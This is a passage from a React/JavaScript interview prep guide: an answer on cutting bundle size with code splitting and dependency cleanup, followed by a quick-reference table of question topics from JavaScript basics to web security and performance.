**Answer:**

| Step | What | Estimated Savings |
|------|------|-------------------|
| 1. **Code splitting** | `React.lazy()` for all 50+ routes | ~60% of initial load (load only Dashboard first) |
| 2. **Remove Material-UI v4** | Migrate to v5 only | ~300KB (entire v4 bundle) |
| 3. **Replace moment with date-fns** | Tree-shakeable date library | ~60KB (moment is 68KB, date-fns imports are ~5KB) |
| 4. **Import lodash functions individually** | `import debounce from 'lodash/debounce'` | ~50KB (full lodash is 71KB) |
| 5. **Remove unused dependencies** | Delete firebase, draft-js, react-draft-wysiwyg | ~200KB+ (firebase alone is 150KB+) |

**Total estimated savings: ~670KB+ (~40-50% reduction)**

**How to measure:** Use `npm run build` and check the output, or use `webpack-bundle-analyzer`:
```bash
npx react-scripts build
npx webpack-bundle-analyzer build/static/js/*.js
```

**Concept:** Bundle optimization — code splitting (load on demand), tree-shaking (remove unused exports), dependency auditing (remove unused packages), and import optimization (specific imports vs full library).

---

---

# Quick Reference — All 60 Questions

| # | Topic | Concept | Difficulty |
|---|-------|---------|------------|
| **JavaScript Core** | | | |
| JS-1 | Promise.reject without return | Promise chains | Medium |
| JS-2 | setTimeout in try-catch | Event loop | Hard |
| JS-3 | Optional chaining `?.` | Null safety | Easy |
| JS-4 | Destructuring defaults | ES6 syntax | Medium |
| JS-5 | Closures in debounce | Closures | Medium |
| JS-6 | .then().catch() vs async/await | Promises | Hard |
| JS-7 | JSON.parse edge cases | Type coercion | Medium |
| JS-8 | Redux thunk middleware | Middleware pattern | Hard |
| JS-9 | Spread for immutability | Immutable updates | Medium |
| JS-10 | Event delegation in React | Events | Medium |
| JS-11 | Class singleton pattern | OOP vs functional | Easy |
| JS-12 | Promise.resolve in async | Async functions | Easy |
| JS-13 | Array.slice for pagination | Array methods | Easy |
| JS-14 | JSON.stringify double-encoding | Serialization | Medium |
| JS-15 | Truthy/falsy & type coercion | Type system | Medium |
| **React Core** | | | |
| RC-1 | useEffect dependency array | Hooks | Medium |
| RC-2 | Controlled vs uncontrolled | Form handling | Medium |
| RC-3 | memo vs useMemo vs useCallback | Performance | Hard |
| RC-4 | HOC vs render props | Component patterns | Medium |
| RC-5 | React keys & reconciliation | Virtual DOM | Hard |
| RC-6 | Context vs Redux | State management | Medium |
| RC-7 | Prop drilling solutions | Component design | Medium |
| RC-8 | useSelector optimization | Redux + React | Hard |
| RC-9 | setState in useEffect | Hooks | Medium |
| RC-10 | Virtual DOM & reconciliation | React internals | Hard |
| RC-11 | combineReducers internals | Redux | Hard |
| RC-12 | ConnectedRouter | React Router + Redux | Medium |
| **Redux** | | | |
| RX-1 | Full Redux data flow | Architecture | Hard |
| RX-2 | REQUEST/SUCCESS/FAILED pattern | Async actions | Medium |
| RX-3 | Action type in state (anti-pattern) | Redux design | Medium |
| **Data Structures** | | | |
| DS-1 | Array.filter for deletion | Arrays | Easy |
| DS-2 | Array.map for immutable update | Arrays + normalization | Medium |
| DS-3 | Client vs server pagination | Arrays + pagination | Medium |
| DS-4 | Search with trie/inverted index | Trie | Hard |
| DS-5 | Graph data in Redux (product hierarchy) | Graph/tree | Hard |
| DS-6 | Sorting algorithms (TimSort) | Sorting | Medium |
| DS-7 | O(1) permission lookup with Set | Hash maps | Easy |
| DS-8 | Debounce vs throttle | Timing patterns | Medium |
| DS-9 | Undo/redo with stacks | Stacks | Hard |
| DS-10 | Trie for autocomplete | Trie | Hard |
| **Security** | | | |
| SW-1 | XSS via dangerouslySetInnerHTML | Web security | Medium |
| SW-2 | localStorage vs httpOnly cookies | Storage security | Medium |
| SW-3 | CORS & same-origin policy | Browser security | Medium |
| SW-4 | CSRF attacks & prevention | Web security | Hard |
| SW-5 | JWT vs session-based auth | Authentication | Medium |
| **Performance** | | | |
| PB-1 | Code splitting with React.lazy | Bundle optimization | Medium |
| PB-2 | Duplicate MUI v4+v5 bundles | Dependencies | Easy |
| PB-3 | React.StrictMode benefits | Development tools | Easy |
| PB-4 | Virtual DOM diffing with lists | Reconciliation | Hard |
| PB-5 | Bundle size reduction steps | Optimization | Medium |
